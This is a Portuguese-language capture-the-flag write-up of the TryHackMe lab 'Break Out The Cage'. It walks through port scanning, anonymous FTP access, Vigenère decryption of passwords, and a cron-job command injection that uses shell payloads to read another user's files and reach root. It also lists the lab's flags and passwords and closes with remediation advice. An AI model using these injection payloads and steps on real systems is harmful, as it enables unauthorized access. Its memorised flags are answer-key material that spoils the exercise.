# Break Out The Cage TryHackMe Writeup

![TryHackMe](https://img.shields.io/badge/TryHackMe-Break%20Out%20The%20Cage-red?style=for-the-badge&logo=tryhackme)
![Dificuldade](https://img.shields.io/badge/Dificuldade-Easy-green?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Pwned%20%F0%9F%92%80-black?style=for-the-badge)

> Writeup completo do room "Break Out The Cage" da plataforma TryHackMe cobrindo reconhecimento, exploração de FTP, quebra de criptografia, injeção de comandos via cron job e escalada de privilégios até root.

---

## Informações

| Campo | Detalhe |
|---|---|
| **Plataforma** | TryHackMe |
| **Room** | Break Out The Cage |
| **IP Alvo** | 10.66.142.219 |
| **OS** | Ubuntu 18.04.4 LTS |
| **Dificuldade** | Easy |
| **Técnicas** | FTP Anon, Vigenère Cipher, Cron Job Injection, PrivEsc |

---

## Índice

1. [Reconhecimento](#1-reconhecimento)
2. [Enumeração FTP](#2-enumeração-ftp)
3. [Análise Web](#3-análise-web)
4. [Quebra de Criptografia](#4-quebra-de-criptografia)
5. [Acesso Inicial via SSH](#5-acesso-inicial-via-ssh)
6. [Escalada de Privilégios weston → cage](#6-escalada-de-privilégios--weston--cage)
7. [Escalada de Privilégios cage → root](#7-escalada-de-privilégios--cage--root)
8. [Flags](#8-flags)
9. [Vulnerabilidades e Recomendações](#9-vulnerabilidades-e-recomendações)

---

## 1. Reconhecimento

Início com varredura de portas para mapear a superfície de ataque.

```bash
nmap -sS -sV -oN scan.txt 10.66.142.219
```

**Resultado:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
```

Três serviços expostos: FTP, SSH e HTTP. Ordem de investigação: FTP → HTTP → SSH.

---

## 2. Enumeração FTP

Teste de acesso anônimo, configuração incorreta muito comum em ambientes mal configurados.

```bash
ftp 10.66.142.219
# Name: anonymous
# Password: [Enter]

ls -la
# -rw-r--r-- 1 0 0 396 May 25 2020 dad_tasks

get dad_tasks
bye
```

O arquivo `dad_tasks` estava codificado em **Base64**:

```bash
cat dad_tasks | base64 -d
```

**Output:**
```
Qapw Eekcl Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
...
Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```

Texto ainda cifrado, análise indica **Cifra de Vigenère**.

> **Vulnerabilidade:** Acesso anônimo ao FTP expondo arquivos com credenciais codificadas.

---

## 3. Análise Web

Enumeração do servidor HTTP na porta 80.

```bash
gobuster dir -u http://10.66.142.219 -w /usr/share/wordlists/dirb/common.txt
```

**Diretórios encontrados:**
```
/contracts  (Status: 301)
/html       (Status: 301)
/images     (Status: 301)
/scripts    (Status: 301)
```

O diretório `/scripts/` continha 5 roteiros gerados aleatoriamente utilizados como distração/contexto temático do room.

O site (`/index.html`) é um blog temático do Nicolas Cage com informações sobre o personagem **Weston** (filho).

---

## 4. Quebra de Criptografia

### 4.1 Decifrando o dad_tasks Credenciais do Weston

O texto do `dad_tasks` estava cifrado com **Vigenère**. Utilizando a ferramenta [guballa.de/vigenere-solver](https://www.guballa.de/vigenere-solver) com análise automática (Kasiski Test):

**Texto cifrado:**
```
Qapw Eekcl Pvr RMKP...
Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```

**Texto decifrado:**
```
Dads Tasks
The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
...
In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

**Credenciais obtidas:**
- Usuário: `weston`
- Senha: `Mydadisghostrideraintthatcoolnocausehesonfirejokes`

### 4.2 Decifrando email do cage e Credenciais do Root

Após acesso ao sistema (seção 6), encontramos nos emails do cage a string `haiinspsyanileph`. O email dava a dica: *"obsessed with my face"* referência ao filme **Face/Off**.

Usando Python para decifrar com chave `FACE`:

```python
def vigenere_decrypt(cipher, key):
    result = ''
    key = key.upper()
    j = 0
    for c in cipher:
        if c.isalpha():
            shift = ord(key[j % len(key)]) - ord('A')
            if c.isupper():
                result += chr((ord(c) - ord('A') - shift) % 26 + ord('A'))
            else:
                result += chr((ord(c) - ord('a') - shift) % 26 + ord('a'))
            j += 1
        else:
            result += c
    return result

print(vigenere_decrypt('haiinspsyanileph', 'FACE'))
# Output: cageisnotalegend
```

**Credenciais root obtidas:** `cageisnotalegend`

---

## 5. Acesso Inicial via SSH

```bash
ssh weston@10.66.142.219
# Password: Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

```
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

Broadcast message from cage@national-treasure:
"Put... the bunny... back... in the box." — Con Air
```

Acesso obtido como `weston`. Mensagens de broadcast do usuário `cage` surgindo a cada minuto indica **cron job em execução**.

---

## 6. Escalada de Privilégios weston → cage

### Enumeração pós-acesso

```bash
id
# uid=1001(weston) gid=1001(weston) groups=1001(weston),1000(cage)
```

`weston` faz parte do grupo `cage` vetor de ataque identificado.

```bash
ls -la /opt/.dads_scripts/
# -rwxr--r-- cage cage spread_the_quotes.py
# drwxrwxr-x cage cage .files/

ls -la /opt/.dads_scripts/.files/
# -rwxrw---- cage cage .quotes
```

O grupo `cage` tem permissão **rw** no arquivo `.quotes`.

### Analisando o script vulnerável

```python
# spread_the_quotes.py
import os, random
lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
# Input não sanitizado!
```

O script lê `.quotes` e passa diretamente para `os.system()` sem sanitização **Command Injection**.

### Exploração

```bash
# Substituir .quotes com payload malicioso
echo "x; cat /home/cage/Super_Duper_Checklist > /tmp/flag.txt; chmod 777 /tmp/flag.txt" > /opt/.dads_scripts/.files/.quotes

# Aguardar 1 minuto (execução do cron)
cat /tmp/flag.txt
```

**User Flag encontrada no checklist:**
```
5 - Figure out why Weston has this etched into his desk: THM{M37AL_0R_P3N_T35T1NG}
```

### Lendo emails do cage via injeção

```bash
echo "x; cat /home/cage/email_backup/email_3 > /tmp/email3.txt; chmod 777 /tmp/email3.txt" > /opt/.dads_scripts/.files/.quotes
# Aguardar cron...
cat /tmp/email3.txt
```

Email revelou a string cifrada `haiinspsyanileph` decifrada para `cageisnotalegend` (seção 4.2).

---

## 7. Escalada de Privilégios cage → root

Com a senha do root obtida via análise dos emails:

```bash
su root
# Password: cageisnotalegend

whoami
# root
```

```bash
cat /root/email_backup/email_2
```

**Root Flag:**
```
THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
```

---

## 8. Flags

| Flag | Valor | Localização |
|---|---|---|
| User Flag | `THM{M37AL_0R_P3N_T35T1NG}` | `/home/cage/Super_Duper_Checklist` |
| Root Flag | `THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}` | `/root/email_backup/email_2` |

---

## 9. Vulnerabilidades e Recomendações

| # | Vulnerabilidade | Severidade | Recomendação |
|---|---|---|---|
| 1 | Acesso anônimo ao FTP com exposição de arquivos | 🔴 Alta | Desabilitar `anonymous_enable=NO` no vsftpd.conf |
| 2 | Criptografia fraca (Vigenère Cipher) | 🟡 Média | Usar hashing moderno (bcrypt/Argon2) para credenciais |
| 3 | Command Injection via cron job (RCE) | 🔴 Crítica | Sanitizar inputs; usar `subprocess` com lista de args |
| 4 | Permissões incorretas em arquivo lido por processo privilegiado | 🔴 Alta | Aplicar princípio do menor privilégio; `chmod 640 .quotes` |
| 5 | Senha fraca do root armazenada em texto claro | 🔴 Crítica | Senha forte + desabilitar login root via SSH |

---

## 🛠️ Ferramentas Utilizadas

- `nmap` — varredura de portas
- `gobuster` — enumeração de diretórios
- `ftp` — acesso ao servidor FTP
- `ssh` — acesso remoto
- `python3` — scripts de análise criptográfica
- [guballa.de/vigenere-solver](https://www.guballa.de/vigenere-solver) — quebra automática de Vigenère

---

*Writeup produzido para fins educacionais. Todos os testes foram realizados em ambiente controlado e autorizado na plataforma TryHackMe.*
